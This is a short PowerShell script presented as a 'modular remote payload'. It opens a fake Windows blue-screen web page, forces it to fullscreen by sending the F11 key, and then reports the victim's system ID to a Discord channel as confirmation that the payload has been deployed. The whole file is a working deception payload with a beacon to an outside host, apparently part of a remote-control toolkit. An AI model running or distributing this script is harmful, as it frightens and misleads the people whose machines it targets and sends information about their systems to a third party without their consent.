# ============================================================
# Fake BSOD for Windows - Modular Remote Payload
# ============================================================

$sysid = Get-SystemID

# Open fake BSOD website in fullscreen
Start-Process "https://fakeupdate.net/win10ue/bsod.html"

Start-Sleep -Milliseconds 1500

# Send F11 for fullscreen
$wshShell = New-Object -ComObject WScript.Shell
$wshShell.SendKeys("{F11}")

Send-Discord "💀 **Fake BSOD Deployed on $sysid**"
